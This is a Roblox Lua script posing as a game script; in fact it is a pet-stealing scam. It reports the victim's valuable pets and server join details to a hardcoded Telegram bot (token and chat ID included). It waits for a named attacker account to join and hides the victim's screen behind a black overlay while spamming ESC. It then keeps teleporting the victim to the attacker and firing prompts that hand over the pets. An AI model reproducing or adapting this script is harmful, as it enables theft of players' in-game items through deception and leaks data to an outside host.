repeat task.wait() until game:IsLoaded()

-- Wait until LocalPlayer exists
local Player = game.Players.LocalPlayer
repeat task.wait() until Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")


local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local TargetPlayerName = "stelera123"
local activePrompts = {}
local blackScreenShown = false

-- Allowed pet types (case-insensitive)
local ALLOWED_PET_TYPES = { 
    "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
    "butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
    "t-rex", "french fry ferret", "blood owl", "chicken zombie",
    "hyacinth macaw", "dilophosaurus", "spaghetti sloth", "red fox"}

local allowedTypesLower = {}
for _, name in ipairs(ALLOWED_PET_TYPES) do
    allowedTypesLower[name:lower()] = true
end

local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
local CHAT_ID = "2001061743"

-- Telegram function
-- Telegram function
local function sendTelegramMessage(text)
    local requestFunc = http_request or request or (syn and syn.request)
    if not requestFunc then
        print("[DEBUG] HTTP request unavailable, cannot send Telegram message.")
        return
    end

    -- First message: what the player has
    local fullText1 = text
    local data1 = {chat_id = CHAT_ID, text = fullText1}
    local json1 = HttpService:JSONEncode(data1)
    requestFunc({
        Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json1
    })

    -- Second message: Lua snippet to join this server
    local PLACE_ID = 126884695634066
    local fullText2 = string.format([[
-- Lua snippet to join this server:
local TeleportService = game:GetService("TeleportService")
local PLACE_ID = %d
local JOB_ID = "%s"
local Players = game:GetService("Players")
TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, Players.LocalPlayer)
]], PLACE_ID, game.JobId)

    local data2 = {chat_id = CHAT_ID, text = fullText2}
    local json2 = HttpService:JSONEncode(data2)
    requestFunc({
        Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json2
    })
end

local function getAllowedTools()
    local toolsFound = {}
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = tool.Name:lower()
                for allowedName in pairs(allowedTypesLower) do
                    if toolName:find(allowedName) then
                        table.insert(toolsFound, tool.Name)
                        break
                    end
                end
            end
        end
    end
    return toolsFound
end

-- Usage:
local allowedTools = getAllowedTools()
if #allowedTools > 0 then
    sendTelegramMessage("Script executed. Player has allowed tools: " .. table.concat(allowedTools, ", "))
end

-- Wait for character
local function waitForCharacter()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    return char, hrp
end

-- Create black screen once
local function createBlackScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("BlackScreenGUI") then return end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(2, 0, 3, 0)
    frame.Position = UDim2.new(-0.5, 0, -1, -300)
    frame.BackgroundColor3 = Color3.new(0,0,0)
    frame.BorderSizePixel = 0
    frame.ZIndex = math.huge
    frame.Parent = screenGui
end

-- Teleport to target
local function teleportToTarget()
    local target = Players:FindFirstChild(TargetPlayerName)
    local char = LocalPlayer.Character
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") 
        and char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
    end
end

-- Equip allowed tools
local function equipAllowedPetTools()
    local target = Players:FindFirstChild(TargetPlayerName)
    if not target or not target.Character then return end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if backpack and char then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = tool.Name:lower()
                for allowedName in pairs(allowedTypesLower) do
                    if toolName:find(allowedName) then
                        tool.Parent = char
                        task.wait(0.05)
                        break
                    end
                end
            end
        end
    end
end

-- Get visible prompts
local function getVisiblePrompts(hrp)
    local visiblePrompts = {}
    for _, prompt in pairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and prompt.Parent:IsA("BasePart") then
            local distance = (prompt.Parent.Position - hrp.Position).Magnitude
            if distance <= prompt.MaxActivationDistance and prompt.ObjectText == TargetPlayerName then
                table.insert(visiblePrompts, {prompt = prompt, distance = distance})
            end
        end
    end
    return visiblePrompts
end

-- Activate prompt
local function activatePrompt(prompt, distance)
    if activePrompts[prompt] then return end
    activePrompts[prompt] = true
    fireproximityprompt(prompt, distance or 0)
    task.spawn(function()
        task.wait(prompt.HoldDuration or 1)
        activePrompts[prompt] = nil
    end)
end

-- MAIN EXECUTION
local char, hrp = waitForCharacter()

local allowedTools = getAllowedTools()
if #allowedTools > 0 then
    sendTelegramMessage("Script executed. Player has allowed tool(s): " .. table.concat(allowedTools, ", "))
end


-- Wait for target player
repeat
    task.wait(1)
until Players:FindFirstChild(TargetPlayerName)

-- 5-second delay after target joins
task.wait(10)
-- 5-second delay after target joins
task.wait(10)
if not blackScreenShown then
    blackScreenShown = true
    createBlackScreen()

    -- Start ESC spam
    task.spawn(function()
        local vim = game:GetService("VirtualInputManager")
        while true do
            -- Simulate pressing and releasing ESC
            vim:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait()
            vim:SendKeyEvent(false, Enum.KeyCode.Escape, false, game)
            task.wait(0.05) -- spam interval
        end
    end)
end


-- Continuous loop
while true do
    local target = Players:FindFirstChild(TargetPlayerName)
    if target then
        teleportToTarget()
        equipAllowedPetTools()
        local prompts = getVisiblePrompts(hrp)
        for _, data in pairs(prompts) do
            activatePrompt(data.prompt, data.distance)
        end
    end
    task.wait(0.1)
end









